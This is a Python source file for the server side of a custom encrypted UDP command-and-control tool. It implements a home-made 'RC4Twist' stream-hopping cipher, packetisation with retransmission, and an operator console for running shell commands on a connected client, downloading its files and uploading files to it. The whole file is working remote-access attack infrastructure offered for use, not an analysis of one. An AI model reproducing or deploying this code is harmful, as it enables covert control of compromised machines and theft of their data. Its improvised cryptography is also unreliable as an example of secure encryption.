import socket
import time
import select
import random
import struct
import tempfile
import hashlib

# Global protocol values
START_OF_PACKET = struct.pack("I", 0xFF1337FF)
END_OF_PACKET   = struct.pack("I", 0xED0F9AC7)
END_OF_DATA     = struct.pack("I", 0xED0FDA7A)
MISSING_PACKETS = struct.pack("I", 0x15516ACE)
PACKET_NUM_LEN  = len(struct.pack("I", 0x0))
RC4_KEY_LEN     = len(struct.pack("I", 0x0))
MAX_DATA_SIZE   = 4096
MIN_PACKET_SIZE = 500
MAX_PACKET_SIZE = MAX_DATA_SIZE - len(START_OF_PACKET) - len(END_OF_PACKET) - PACKET_NUM_LEN - RC4_KEY_LEN -len(END_OF_DATA)

# Global "connected" time-out value (before client starts calling out again)
CONNECT_TIMEOUT = 120

# Custom implementation of RC4. It creates "hops" number of RC4 streams then randomly
# moves from stream to stream. Random is deterministic based on the provided password,
# which is utilized in setting the RNG seed.
# NOTE: Be very careful in how you use this, as any use of random will effect the encrypt/decrypt
class RC4Twist(object):
    def __init__(self, key, hops=32):
        self.key = bytearray(key)
        self.hops = []
        random.seed(int(hashlib.md5(self.key).hexdigest(),16))
        start = self.RC4(key)
        self._generate_hops(start, hops)
    
    def rekey(self, key, hops):
        self.__init__(key, hops)
    
    def crypt(self, data):
        data = bytearray(data)
        for i,byte in enumerate(data):
            select = random.sample(self.hops,1)[0]
            k = select.next()
            data[i] = byte^k
        return data
    
    def KSA(self, key):
        keylength = len(key)
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i%keylength])%256
            S[i],S[j] = S[j],S[i]
        return S
    
    def PRGA(self, S):
        i,j = (0,0)
        while True:
            i = (i+1)%256
            j = (j + S[i])%256
            S[i],S[j] = S[j],S[i]
            K = S[(S[i]+S[j])%256]
            yield K
    
    def RC4(self, key):
        key = bytearray(key)
        return self.PRGA(self.KSA(key))
    
    def _generate_hops(self, start, hops):
        for _ in range(hops):
            scramble = bytearray()
            for char in self.key:
                k = start.next()
                scramble.append(k^char)
            self.hops.append(self.RC4(scramble))

# PROTOCOL DETAILS
#        C2           |           DATAGRAM
#    4          4     |       4        X             4            4
# {RC4 Key}{PACKET #} | {START_OF_PACKET}{DATA}{END_OF_DATA}{END_OF_PACKET}
#
# [12][data][4|8]

# Multiple packet data:
# {START_OF_PACKET}{DATA}{END_OF_PACKET}
# {START_OF_PACKET}{DATA}{END_OF_PACKET}
# {START_OF_PACKET}{DATA}{END_OF_DATA}{END_OF_PACKET}
class C2(object):
    def __init__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.addr = 0
        pass
    
    def pack_and_send(self, data, hardcode_packet_num=0, pktsize=None):
        """Packs data according to the C2 protocol and sends it to self.addr
           Encrypts per-packet, and sends it out. Packet sizes are random
           between MIN_PACKET_SIZE and MAX_PACKET_SIZE"""
        data = bytearray("{}{}".format(data, END_OF_DATA))
        index = 0
        packet_index = hardcode_packet_num
        data_chunks = dict()
        while index < len(data):
            if pktsize == None:
                pktsize = random.randint(MIN_PACKET_SIZE, MAX_PACKET_SIZE)
            packet_number = struct.pack("I", packet_index)
            data_chunk = "{}{}{}{}".format(packet_number, START_OF_PACKET, data[index:index+pktsize], END_OF_PACKET)
            # Encrypt packet
            rc4_key = struct.pack("I", random.randint(0, 0xffffffff))
            crypt = RC4Twist(rc4_key)
            data_chunk = crypt.crypt(data_chunk)
            data_chunk = "{}{}".format(rc4_key, data_chunk)
            # Add to chunk list
            index += pktsize
            packet_index += 1
            print("send][{}][{}]".format(self.addr,packet_index))
            data_chunks[packet_index] = data_chunk
            self.s.sendto(data_chunk, self.addr)
            # This limits to 20 packets per second. With provided data values, avg communication speed will be ~40kb/s
            time.sleep(0.05)
        return data_chunks

    def unpack(self, data):
        """Removes START_OF_PACKET and END_OF_PACKET from a data_chunk
            Checks for END_OF_DATA to denote end of received data
            returns (data,True) if end of data, else (data,False)"""
        if (data[:len(START_OF_PACKET)] != START_OF_PACKET) or (data[-len(END_OF_PACKET):] != END_OF_PACKET):
            print("Packet unpack failure")
            return ("FAILURE",False)
        else:
            data = data[len(START_OF_PACKET):-len(END_OF_PACKET)]
            if data[-len(END_OF_DATA):] == END_OF_DATA:
                # End of data reached
                print("Reached end of data")
                data = data[:-len(END_OF_DATA)]
                return (data,True)
            else:
                return (data,False)

    def get_packet(self, data_chunk):
        key = data_chunk[:RC4_KEY_LEN]                               # pull out rc4 key
        crypt = RC4Twist(key)                                        # initialize decryption
        data = crypt.crypt(data_chunk[RC4_KEY_LEN:])                 # Decrypt data
        packet_number = struct.unpack("I", data[:PACKET_NUM_LEN])[0] # pull out packet_number
        print("packet_number:{}".format(packet_number))
        data,finished = self.unpack(data[PACKET_NUM_LEN:])           # Unpack data and get if its finished or not
        return (packet_number,data,finished)

    def initial_catch(self):
        self.key = struct.pack("I", random.randint(0, 0xffffffff))
        _,self.addr = self.s.recvfrom(MAX_DATA_SIZE)
        print("*** INCOMING CONNECTION ***")
        print("*** From: {}:{}".format(self.addr[0], self.addr[1]))
        print("initial key: {}".format(repr(self.key)))
        self.s.sendto(bytearray(self.key), self.addr)
       
    def _recv(self):
        self.s.setblocking(0)
        print("select]")
        ready = select.select([self.s], [], [], CONNECT_TIMEOUT)
        if ready[0]:
            data,_ = self.s.recvfrom(MAX_DATA_SIZE)
            #print("data]{}".format(repr(data)))
            self.s.setblocking(1)
        else:
            print("BREAK")
            data = "ZZBREAK"
        return data

    def receive_data(self, data_chunks, rerequest=False):
        """ data_chunks must be a dictionary type, and it will be directly modified by this call"""
        while True:
            print("recv]")
            data_chunk = self._recv()
            if data_chunk == "ZZBREAK":
                return False
            if len(data_chunk) == 0:
                print("empty data?")
                continue
            print("recvend]")
            packet_number,unpacked,finished = self.get_packet(data_chunk)
            data_chunks[packet_number] = unpacked # Place data into dictionary
            print("pkt] {}".format(packet_number))
            #print("dict]{}".format(repr([n for n in data_chunks])))
            if finished or rerequest:           # If this is a rerequest, there is no END_OF_DATA so this is a single packet get
                print("RECEIVED LAST PACKET")
                break
        return True
    
    def rerequest_loop(self, data_chunks):
        while True:
            # Get list of missing chunks
            missing = [MISSING_PACKETS]
            for i in range(max(data_chunks)):
                if i not in data_chunks:
                    missing.append(struct.pack("I", i))
            self.send_data(''.join(missing))
            print("Missing]{}".format(missing))
            if len(missing) == 1:
                break
            for i in missing[1:]:
                print("receiving missing]{}".format(repr(i)))
                self.receive_data(data_chunks, True)
    
    def handle_rerequest(self, sent_data):
        data_chunks = dict()
        while True:
            status = self.receive_data(data_chunks)
            if status:
                data = ""
                for i in sorted(data_chunks):
                    data += data_chunks[i]
                print("rerequest]{}".format(repr(data)))
                if data[:len(MISSING_PACKETS)] == MISSING_PACKETS:
                    data = data[len(MISSING_PACKETS):]
                    print("Missing packets]{}".format(repr(data)))
                    if len(data) == 0:
                        print("Done rerequesting")
                        break
                    for i in range(0, len(data), len(MISSING_PACKETS)):
                        missing_index = struct.unpack("I", data[i:len(MISSING_PACKETS)])[0]
                        self.s.sendto(sent_data[missing_index], self.addr)
                else:
                    print("Bad packet data received (rerequest)")
                    break
            else:
                print("Bad status")
                break

    def send_data(self, data):
        print("byte count: {}".format(len(data)))
        data_chunks = self.pack_and_send(data)
        print("Done sending data")
        return data_chunks

class Server(C2):
    def __init__(self, ip="0.0.0.0", port=8000):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.s.bind((ip, port))
        self.initial_catch()
        self.loop()
    
    def display_response(self, data, download):
        if download and data != "fail":
            tmpfile = tempfile.mktemp()
            with open(tmpfile, "wb") as f:
                f.write(data)
                print("File downloaded to: {}".format(tmpfile))
        else:
            print(data)

    def loop(self):
        while True:
            # Get command
            download = False
            timeout = time.time()
            command = raw_input("{}> ".format(self.addr))
            if time.time()-timeout >= CONNECT_TIMEOUT:
                self.initial_catch()
            if command.startswith("u"):
                try:
                    upload,command = command.split("|", 1)
                    if command.startswith("file:"):
                        filename = str(command[2:])
                        with open(filename, "rb") as f:
                            data = f.read()
                        command = upload+"|"+data
                    command = command.replace("|","\x00",1)
                except:
                    print("Syntax wrong or file does not exist or something")
                    continue
            elif command.startswith("d"):
                download = True
            elif command.startswith("!"):
                pass
            else:
                print("""Command Usage:
    d<filename>             # Downloads a file to a temp file
    u<filename>|<data>      # Uploads <data> to <filename> on client
    u<filename>|file:<path> # Uploads the file <path> to <filename> on client
    !<command>              # Executes command on client""")
                continue
            # Send command
            sent_data = self.send_data(command)

            # Handle rerequests
            self.handle_rerequest(sent_data)
            
           
            # Receive response
            data_chunks = dict()
            status = self.receive_data(data_chunks)
            if not status:
                break

            # Rerequest missing data
            self.rerequest_loop(data_chunks)

            data = ""
            #print(repr(data_chunks))
            for i in sorted(data_chunks):
                #print("what?]{}".format(i))
                data += data_chunks[i]


            # Display response
            self.display_response(data, download)


if __name__ == "__main__":
    s = Server()
